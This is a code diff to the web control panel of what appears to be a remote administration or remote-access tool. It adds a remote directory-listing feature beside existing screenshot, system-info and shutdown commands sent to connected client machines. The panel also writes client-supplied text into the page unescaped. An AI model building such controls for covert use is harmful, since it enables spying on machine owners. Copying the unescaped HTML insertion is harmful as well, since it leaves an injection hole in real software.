@@ -3,6 +3,7 @@
   <div id="list">
 
   </div>
+  <div id="tree"></div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.2/socket.io.js"></script>
   <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
   <script>
@@ -18,6 +19,7 @@
           <button onclick="sendoff(${c})">turn off</button>
           <button onclick="systeminfo(${c})">system info</button>
           <button onclick="screenshot(${c})">screenshot</button>
+          <button onclick="ls(${c}, 'C://')">ls</button>
         </div>
         `;
       $('#list').append($(template));
@@ -25,12 +27,22 @@
 
     socket.on('client:disconect', function(c) {
       $('#list div#' + c).remove();
+      $('#tree').empty();
     });
 
     socket.on('client:update', function(obj) {
       const $el = $('div#' + obj.sid);
       $el.find('.uid').html(obj.uid);
-      $el.find('.cmd').html(obj.msg);
+      $('#tree').html(obj.msg);
+
+      try {
+        const ans = JSON.parse(obj.msg);
+        if (ans.ls) {
+          fileTree(obj.sid, ans.ls);
+        }
+      } catch(e) {
+        console.info('error', e);
+      }
     });
 
     function sendoff(cl) {
@@ -51,6 +63,29 @@
     function screenshot(cl) {
       console.log('screenshot', cl);
       socket.emit('client:send', {sid: cl, cmd: 'screenshot'});
+    }
+
+    let currPath;
+    function ls(cl, path) {
+      currPath = path.indexOf('..') != -1  ? 'C://' : path;
+      console.log('ls', cl, path);
+      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath});
+    }
+
+
+    function fileTree(c, f) {
+      const $tree = $('#tree');
+      $tree.empty();
+      $tree.data('client', c);
+      for (var i in f) {
+        const x = f[i].replace('./', '');
+        const el = $('<div style="cursor:pointer" id="' + x + '">');
+        el.html(f[i]);
+        console.log(f[i][0]);
+        if (f[i][0] == '.') el.on('click', () => ls(c, currPath + x + '/'));
+
+        $tree.append(el);
+      }
     }
   </script>
 </body>
